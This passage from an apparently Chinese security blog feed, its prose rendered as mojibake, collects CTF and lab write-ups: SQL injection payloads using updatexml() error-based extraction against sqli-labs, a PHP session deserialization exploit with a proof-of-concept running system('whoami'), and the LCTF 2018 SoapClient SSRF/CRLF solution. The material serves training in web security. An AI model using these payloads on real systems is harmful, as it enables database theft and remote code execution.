<h3 id="Lass-12"><a href="#Lass-12" class="headerlink" title="Lass-12"></a><code>Lass-12</code></h3><p>è¾“å…¥<code>1</code>ï¼Œå›æ˜¾é”™è¯¯ï¼Œæ— æŠ¥é”™ä¿¡æ¯</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926822.png" alt="image-20241101200021319" style="zoom: 33%;" />

<p>è¾“å…¥<code>1&#39;</code>ï¼Œå›æ˜¾é”™è¯¯ï¼Œæ— æŠ¥é”™ä¿¡æ¯</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926212.png" alt="image-20241101200059415" style="zoom: 33%;" />

<p>è¾“å…¥<code>1&quot;</code>ï¼Œå›æ˜¾é”™è¯¯ï¼Œæœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ®æ­¤æ¨æ–­å‡ºé—­åˆç¬¦å·ä¸º<code>&quot;)</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926637.png" alt="image-20241101200133728" style="zoom:50%;" />

<p>å°è¯•è¾“å…¥<code>1&quot;) or 1=1#</code>ï¼Œå›æ˜¾æ­£ç¡®</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927444.png" alt="image-20241101200210040" style="zoom:50%;" />

<p>æ¥ä¸‹æ¥ä½¿ç”¨**<code>union</code>è”åˆæŸ¥è¯¢**</p>
<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><code>Less-17</code></h3><p>â€‹	æœ¬é¢˜æœ‰ä¸€ä¸ªå‘ï¼Œ<code>Username</code>ä¸­éœ€å¡«å…¥æ­£ç¡®çš„ç”¨æˆ·åï¼Œæ³¨å…¥ä½ç½®åœ¨<code>Password</code>å¤„ï¼Œä½¿ç”¨**<code>updatexml()</code>å‡½æ•°æŠ¥é”™æ³¨å…¥**å³å¯ã€‚</p>
<p>ä½†æ˜¯å½“æˆ‘ä»¬çˆ†å­—æ®µæ—¶åˆå‡ºç°äº†å¦ä¸€ä¸ªé—®é¢˜ï¼Œè¾“å…¥ä¸‹é¢<code>payload</code>æ—¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>æœ‰å¦‚ä¸‹æŠ¥é”™</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927184.png" alt="image-20241101212954595" style="zoom:67%;" />

<p>ä¿®æ”¹<code>payload</code>ï¼Œä½¿**<code>select</code>çš„ç»“æœå†é€šè¿‡ä¸€ä¸ªä¸­é—´è¡¨<code>select</code>å¤šä¸€æ¬¡**ï¼Œä¾¿å¯ä»¥ç»•è¿‡ä¸Šé¢çš„é—®é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM (SELECT * FROM users) as hmhwazyt5799),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸè¿”å›<code>username</code>å­—æ®µå†…å®¹</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927517.png" alt="image-20241101214340490" style="zoom:50%;" />

<h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p>å¾€å¾€ä¸€æ¬¡æ³¨å…¥åï¼Œè¿˜è¦æ³¨å…¥ç¬¬äºŒæ¬¡æ‰èƒ½æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>å¯¹äºè¿™ç§</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919088.png" alt="image-20250111143734313" style="zoom:150%;" />

<p>å¯ä»¥åƒä¸‹é¢è¿™æ ·æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)#</span><br></pre></td></tr></table></figure>

<h2 id="ç»•è¿‡å­—æ•°é™åˆ¶çš„ä¸€äº›å‡½æ•°"><a href="#ç»•è¿‡å­—æ•°é™åˆ¶çš„ä¸€äº›å‡½æ•°" class="headerlink" title="ç»•è¿‡å­—æ•°é™åˆ¶çš„ä¸€äº›å‡½æ•°"></a>ç»•è¿‡å­—æ•°é™åˆ¶çš„ä¸€äº›å‡½æ•°</h2><ul>
<li><code>substr</code></li>
<li><code>left</code></li>
<li><strong><code>regexp</code>æ­£åˆ™åŒ¹é…</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(group_concat(flag))from(users)where(flag)regexp(&#x27;^f&#x27;)</span><br><span class="line">#åŒ¹é…å­—ç¬¦fï¼Œå¹¶ä»¥ç¬¬ä¸€ä¸ªfå¼€å§‹è¾“å‡º</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>reverse</code>é€†è½¬è¾“å‡º</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reverse(select group_concat(flag) from users)</span><br><span class="line">#ä¼šå€’ç€ä»æœ€åä¸€ä¸ªå­—ç¬¦å¼€å§‹è¾“å‡º</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPSessionååºåˆ—åŒ–</title>
    <url>/2025/02/06/web%E5%AE%89%E5%85%A8-phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="æœ‰å…³sessionçš„åŸºç¡€çŸ¥è¯†"><a href="#æœ‰å…³sessionçš„åŸºç¡€çŸ¥è¯†" class="headerlink" title="æœ‰å…³sessionçš„åŸºç¡€çŸ¥è¯†"></a>æœ‰å…³sessionçš„åŸºç¡€çŸ¥è¯†</h2><p>å…ˆæ¥äº†è§£ä¸€ä¸‹å…³äº<code>session</code>çš„ä¸€äº›åŸºç¡€çŸ¥è¯†</p>
<p>ä»€ä¹ˆæ˜¯sessionï¼Ÿ</p>
<span id="more"></span>

<blockquote>
<p>åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„  Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web  é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚</p>
</blockquote>
<p>sessionæ˜¯å¦‚ä½•èµ·ä½œç”¨çš„ï¼Ÿ</p>
<blockquote>
<p>å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session  IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session  IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion  IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚</p>
</blockquote>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦çŸ¥é“<code>session_start()</code>è¿™ä¸ªå‡½æ•°å·²ç»è¿™ä¸ªå‡½æ•°æ‰€èµ·çš„ä½œç”¨ï¼š</p>
<blockquote>
<p>å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP  å†…éƒ¨ä¼šä¾æ®å®¢æˆ·ç«¯ä¼ æ¥çš„PHPSESSIDæ¥è·å–ç°æœ‰çš„å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼ˆå³sessionæ–‡ä»¶ï¼‰ï¼Œ PHP  ä¼šè‡ªåŠ¨ååºåˆ—åŒ–sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†ä¹‹å¡«å……åˆ° $_SESSION  è¶…çº§å…¨å±€å˜é‡ä¸­ã€‚å¦‚æœä¸å­˜åœ¨å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼Œåˆ™åˆ›å»ºåä¸ºsess_PHPSESSID(å®¢æˆ·ç«¯ä¼ æ¥çš„)çš„æ–‡ä»¶ã€‚å¦‚æœå®¢æˆ·ç«¯æœªå‘é€PHPSESSIDï¼Œåˆ™åˆ›å»ºä¸€ä¸ªç”±32ä¸ªå­—æ¯ç»„æˆçš„PHPSESSIDï¼Œå¹¶è¿”å›set-cookieã€‚</p>
</blockquote>
<h2 id="PHPSessionåºåˆ—åŒ–æœºåˆ¶"><a href="#PHPSessionåºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="PHPSessionåºåˆ—åŒ–æœºåˆ¶"></a>PHPSessionåºåˆ—åŒ–æœºåˆ¶</h2><p>å…ˆäº†è§£ä¸€ä¸‹php.iniä¸­çš„ä¸€äº›Sessioné…ç½®</p>
<blockquote>
<p>session.save_path&#x3D;â€â€ â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„<br>session.save_handler&#x3D;â€â€â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)<br>session.auto_start boolenâ€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨<br>session.serialize_handler stringâ€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</p>
</blockquote>
<p>Linuxä¸Šæ­å»ºçš„è¯ï¼Œå¸¸è§çš„<code>php-session</code>å­˜æ”¾ä½ç½®ï¼š<br>&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sess_PHPSESSIDã€&#x2F;var&#x2F;lib&#x2F;php7&#x2F;sess_PHPSESSIDã€&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSIDã€&#x2F;tmp&#x2F;sess_PHPSESSIDã€&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSED</p>
<p>æ ¹æ®<code>php.ini</code>ä¸­çš„é…ç½®é¡¹ï¼Œå°†<code>$_SESSION</code>ä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°<code>PHPSESSID</code>å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨çš„ä¸‰ç§ä¸åŒçš„å¤„ç†æ ¼å¼ï¼Œå³<code>session.serialize_handler</code>å®šä¹‰çš„ä¸‰ç§å¼•æ“ï¼š</p>
<table>
<thead>
<tr>
<th>å¤„ç†å™¨</th>
<th>å­˜å‚¨æ ¼å¼</th>
<th>ä¾‹å­</th>
</tr>
</thead>
<tbody><tr>
<td>php_serialize</td>
<td>ç»è¿‡serialize()å‡½æ•°ååºåˆ—åçš„æ•°ç»„</td>
<td>a:1:{s:8:â€sesssionâ€;s:3:â€hhhâ€;}</td>
</tr>
<tr>
<td>php</td>
<td>é”®å+&#96;</td>
<td>&#96;+ç»è¿‡serialize()å‡½æ•°ååºåˆ—åçš„å€¼</td>
</tr>
<tr>
<td>php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()ååºåˆ—åçš„å€¼</td>
<td>ä¸å¯è§å­—ç¬¦+sesssions:3:â€hhhâ€;</td>
</tr>
</tbody></table>
<h2 id="æ¼æ´åˆ©ç”¨æ¼”ç¤º"><a href="#æ¼æ´åˆ©ç”¨æ¼”ç¤º" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¼”ç¤º"></a>æ¼æ´åˆ©ç”¨æ¼”ç¤º</h2><p>ps.phpæ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);<span class="comment">//ç”¨äºåœ¨è¿è¡Œæ—¶è®¾ç½®é…ç½®é€‰é¡¹</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();<span class="comment">//ç”¨äºå¯åŠ¨ä¸€ä¸ªæ–°çš„ä¼šè¯æˆ–æ¢å¤ç°æœ‰çš„ä¼šè¯ã€‚ä¼šè¯æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œé€šè¿‡ä¼šè¯IDï¼ˆé€šå¸¸å­˜å‚¨åœ¨Cookieä¸­ï¼‰æ¥è¯†åˆ«ã€‚</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sesssion&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ses&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>p.phpæ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(); </span><br></pre></td></tr></table></figure>

<p>poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#è¾“å‡º:   O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>è¿è¡Œpoc.phpå¾—åˆ°payloadï¼š<strong>O:1:â€Aâ€:1:{s:4:â€nameâ€;s:17:â€system(â€˜whoamiâ€™);â€;}</strong></li>
<li>è®¿é—®ps.phpï¼Œ**ps.php?ses&#x3D;|O:1:â€Aâ€:1:{s:4:â€nameâ€;s:17:â€system(â€˜whoamiâ€™);â€;}**ã€‚</li>
<li>è®¿é—®p.phpã€‚</li>
</ol>
<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†payloadä¸­çš„<code>system(&#39;whoami&#39;)</code>å‡½æ•°ï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151428.png" alt="image-20250127205956973"></p>
<p>â€‹	åœ¨è®¿é—®ps.phpåä¼šç”Ÿæˆä¸€ä¸ªPHPSESSIDæ–‡ä»¶ï¼Œä½¿ç”¨php_serializeå¤„ç†å™¨æ¥å­˜å‚¨çš„sessionæ•°æ®ï¼Œå…¶å†…å®¹ä¸ºï¼š**a:1:{s:8:â€sesssionâ€;s:49:â€|O:1:â€Aâ€:1:{s:4:â€nameâ€;s:17:â€system(â€˜whoamiâ€™);â€;}**ã€‚è€Œå½“æˆ‘ä»¬å†å»è®¿é—®p.phpæ—¶ï¼Œ<code>session_start()</code>æ‰¾åˆ°çš„æ–‡ä»¶ä¾ç„¶æ˜¯ä¹‹å‰çš„PHPSESSIDæ–‡ä»¶ï¼Œphpå¤„ç†å™¨åœ¨å¤„ç†é‡Œé¢çš„sessionæ•°æ®æ—¶ï¼Œå°†<code>|</code>å‰é¢çš„å†…å®¹å½“ä½œé”®åï¼Œ<code>|</code>åé¢çš„å†…å®¹å½“ä½œä¹‹å‰åºåˆ—åŒ–çš„å€¼ã€‚æ•…è€Œä¼šå¯¹payloadè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿›è€Œè§¦å‘__wakeupæ–¹æ³•ï¼Œæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<h2 id="ä¾‹é¢˜-bestphpâ€™s-revenge"><a href="#ä¾‹é¢˜-bestphpâ€™s-revenge" class="headerlink" title="ä¾‹é¢˜-bestphpâ€™s revenge"></a>ä¾‹é¢˜-bestphpâ€™s revenge</h2><p>å…ˆå­¦ä¹ ä¸¤ä¸ªå‡½æ•°ï¼š</p>
<ol>
<li><strong><code>call_user_func</code>å‡½æ•°ç”¨äºè°ƒç”¨ä¸€ä¸ªå¯è°ƒç”¨çš„å‡½æ•°æˆ–æ–¹æ³•ã€‚è°ƒç”¨å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼ˆå‡½æ•°åï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ï¼›è°ƒç”¨æ–¹æ³•ï¼Œåªç”¨åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­ä¾æ¬¡ä¸ºç±»åã€æ–¹æ³•åã€‚</strong></li>
<li><strong><code>extract</code>å‡½æ•°ç”¨äºä»æ•°ç»„ä¸­å¯¼å…¥å˜é‡åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œå³å°†æ•°ç»„çš„é”®ä½œä¸ºå˜é‡åï¼Œæ•°ç»„çš„å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚</strong></li>
</ol>
<p>æºç å¦‚ä¸‹ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151977.png" alt="image-20250127232948786" style="zoom:80%;" />

<p>æ‰«æç›®å½•ï¼Œæœ‰ä¸€ä¸ªflag.phpæ–‡ä»¶ï¼Œç”±è¯¥æ–‡ä»¶å¾—çŸ¥åªæœ‰127.0.0.1è¯·æ±‚è¯¥é¡µé¢æ‰èƒ½å¾—åˆ°flagï¼Œæ‰€ä»¥è¿™æ˜æ˜¾æ˜¯è€ƒå¯ŸSSRFæ¼æ´ã€‚</p>
<p>å¤§è‡´æ€è·¯ï¼šåˆ©ç”¨åŸç”Ÿç±»SoapClientä¸­çš„<code>__call</code>æ–¹æ³•è¿›è¡ŒSSRFå’ŒCRLFæ³¨å…¥ï¼Œæ¥ä¼ªé€ ä»»æ„headerã€‚ä½†æ˜¯è¿™é“é¢˜æ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°ï¼Œè¿™æ—¶å€™ä¾¿è¦åˆ©ç”¨PHPSessionååºåˆ—åŒ–æ¼æ´æ¥è§¦å‘SoapClientç±»çš„__callæ–¹æ³•äº†ã€‚</p>
<ol>
<li><p>PHPSessionååºåˆ—åŒ–ï¼Œæ„é€ SoapClientç±»åŠå…¶ä¸­çš„ä»»æ„headerã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$agent</span> = <span class="string">&quot;npfs\r\nCookie: PHPSESSID=579999\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$location</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$agent</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="variable">$uri</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));   <span class="comment">#é˜²æ­¢è¿‡æ»¤ä½¿ç”¨urlç¼–ç </span></span><br></pre></td></tr></table></figure>

<p>ä¼ªé€ sessionéœ€è¦ç¬¬ä¸€æ¬¡ä»¥php_serializeå¤„ç†å™¨æ¥å­˜å‚¨sessionæ•°æ®ï¼Œè€Œé»˜è®¤çš„å¤„ç†å™¨æ˜¯phpæ‰€ä»¥è¯¥æ€ä¹ˆåŠå‘¢ï¼ŸPHP7ä¸­çš„session_start()å‡½æ•°å¯ä»¥æ¥æ”¶ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œç„¶åè¦†ç›–php.iniä¸­çš„sessionçš„é…ç½®é¡¹ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´æ‰§è¡Œæˆ‘ä»¬è®©æºç æ‰§è¡Œ<code>session_stsrt(array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;))</code>å³å¯ï¼Œä½†æ˜¯æ€ä¹ˆèƒ½æ‰§è¡Œå‘¢ï¼Ÿåˆ©ç”¨call_user_func()å’Œextract()è¿™ä¸¤ä¸ªå‡½æ•°å°±è¡Œäº†ã€‚</p>
<p>GETå‚æ•°fä¼ å…¥<code>session_start</code>ã€nameä¼ å…¥pocï¼ŒPOSTä¼ å…¥<code>serialize_handler=php_serialize</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151191.png" alt="image-20250128004506601"></p>
</li>
<li><p>è®¿é—®SoapClientç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘__callæ–¹æ³•ã€‚</p>
<p>GETå‚æ•°fä¼ å…¥<code>extract</code>ã€nameä¼ å…¥<code>SoapClient</code>ï¼ŒPOSTä¼ å…¥<code>b=call_user_func</code>ã€‚</p>
<p>å†™ä¸€ä¸‹ä»£ç è¿è¡Œå¤§è‡´è¿‡ç¨‹ï¼š<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>å˜æˆ<code>call_user_func(&#39;extract&#39;,&#39;b=call_user_func&#39;)</code>ï¼Œå¾—åˆ°<code>$b=call_user_func</code>ï¼›<code>$_SESSION[&#39;name&#39;]=$_GET[&#39;name&#39;]=SoapClient</code>ï¼Œåˆå› ä¸º<code>$a=array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code>å¾—<code>$a=array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;)</code>ï¼Œæœ€å<code>call_user_func($b,$a)</code>è§¦å‘__callæ–¹æ³•ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151985.png" alt="image-20250128010121343" style="zoom: 67%;" />
</li>
<li><p>è®¿é—®index.phpï¼ŒbpæŠ“åŒ…ä¿®æ”¹PHSESSIDå€¼ä¸º579999ï¼ˆå‰é¢ä¼ªé€ çš„headerä¸­çš„PHPSESSIDå€¼ï¼‰ï¼Œå³å¯å¾—åˆ°flagã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151087.png" alt="image-20250128010426077"></p>
</li>
</ol>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://xz.aliyun.com/news/6962">https://xz.aliyun.com/news/6962</a></p>
<p><a href="https://www.freebuf.com/articles/web/324519.html">https://www.freebuf.com/articles/web/324519.html</a></p>
<p><a href="https://blog.csdn.net/m0_73512445/article/details/134978636">[LCTF 2018]bestphpâ€˜s revenge</a></p>
<p><a href="https://www.cnblogs.com/NPFS/p/14335370.html">https://www.cnblogs.com/NPFS/p/14335370.html</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labsé¶åœºé€šå…³è®°å½•</title>
    <url>/2024/10/22/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Upload Labs æ˜¯ä¸€ä¸ªåŸºäº PHP ç¼–å†™çš„å¼€æºé¶åœºé¡¹ç›®ï¼Œä¸“é—¨ç”¨äºæ¨¡æ‹Ÿå’Œç ”ç©¶æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚å®ƒåŒ…å«å¤šä¸ªå…³å¡ï¼Œæ¯ä¸ªå…³å¡éƒ½æ¨¡æ‹Ÿäº†ä¸åŒçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´åœºæ™¯ï¼Œæ—¨åœ¨å¸®åŠ©ç”¨æˆ·å…¨é¢äº†è§£æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸç†ã€åˆ©ç”¨æ–¹æ³•å’Œé˜²å¾¡ç­–ç•¥ã€‚</p>
<span id="more"></span>

<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://www.cnblogs.com/henry666/p/17051491.html">å…¨é¢äº†è§£æ–‡ä»¶ä¸Šä¼ æ¼æ´, é€šå…³upload-labsé¶åœº! - äº¨åˆ©å…¶å®å¾ˆå - åšå®¢å›­</a></p>
<p><a href="https://www.cnblogs.com/xiaoyus/articles/18250023">upload-labsé€šå…³å…¨æ•™ç¨‹ï¼ˆå»ºè®®èŒæ–°æ”¶è—ï¼‰Webå®‰å…¨-æ–‡ä»¶ä¸Šä¼ æ¼æ´è¶…è¯¦ç»†è§£æ - ç™½å°é›¨ - åšå®¢å›­</a></p>
<p><a href="https://www.cnblogs.com/iChet/p/16124082.html">æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹upload-labsé¶åœºé€šå…³(20å…³) - iChet - åšå®¢å›­</a></p>
